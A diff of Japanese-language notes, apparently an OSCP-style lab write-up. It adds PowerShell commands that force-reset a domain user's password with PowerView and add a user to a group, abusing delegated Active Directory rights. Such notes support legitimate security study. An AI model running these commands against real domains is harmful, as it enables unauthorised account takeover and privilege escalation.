@@ -311,9 +311,15 @@ cmdkey ->なし
 	- また、G.JARVISは、WS26にRemote Managerの権限をもつ
 ![[Pasted image 20260222163423.png]]
 
+- パスワード変更を実行
 ```powershell
 $NewPassword = ConvertTo-SecureString "Password123" -AsPlainText -Force
 Set-DomainUserPassword -Identity "CN=g.jarvis,CN=Users,DC=oscp,DC=exam" -AccountPassword $NewPassword
+```
+
+- グループにも追加しておく
+```powershell
+Add-ADGroupMember -Identity "<ターゲットグループオブジェクト名>" -Members "<target_user>"
 ```
 
 - パスワード変更に成功
